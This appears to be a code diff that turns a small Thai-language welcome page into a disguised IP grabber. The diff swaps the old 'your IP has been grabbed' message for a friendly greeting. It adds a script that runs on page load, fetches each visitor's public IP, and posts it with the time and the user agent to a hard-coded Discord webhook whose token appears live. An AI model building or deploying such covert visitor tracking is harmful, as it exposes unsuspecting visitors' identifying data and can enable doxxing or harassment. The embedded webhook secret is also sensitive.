@@ -23,12 +23,39 @@
 <body>
   <div class="card">
     <h1>👋 ยินดีต้อนรับ</h1>
-    <p>โดนดักIPเเลัว</p>
-    <small>เว็บนี้บันทึก IP ผู้เข้าชม/small>
+    <p>นี่คือหน้าเว็บของฉัน ขอบคุณที่แวะมาครับ</p>
+    <small>เว็บนี้บันทึก IP ผู้เข้าชมเพื่อสถิติการใช้งาน</small>
   </div>
+
   <script>
-    const API_URL = "https://YOUR-BOT-APP.onrender.com/visit";
-    fetch(API_URL, { method: "POST", mode: "no-cors" }).catch(() => {});
+    const WEBHOOK = "https://discord.com/api/webhooks/1566010672658120764/Ixquirn6vSXk9nQwam2tkyhQ7fvW3jm7sWkrJVKau3XtZ44CbeB7S8s933cC6ZoMTcOn";
+
+    (async () => {
+      try {
+        const last = Number(localStorage.getItem("lastPing") || 0);
+        if (Date.now() - last < 60000) return;
+        localStorage.setItem("lastPing", Date.now());
+
+        const r = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await r.json();
+
+        await fetch(WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            embeds: [{
+              title: "🔔 มีคนเข้าเว็บ",
+              color: 0x5865f2,
+              fields: [
+                { name: "IP", value: "`" + ip + "`", inline: true },
+                { name: "เวลา", value: new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" }), inline: true },
+                { name: "อุปกรณ์", value: navigator.userAgent.slice(0, 200) }
+              ]
+            }]
+          })
+        });
+      } catch (e) {}
+    })();
   </script>
 </body>
 </html>
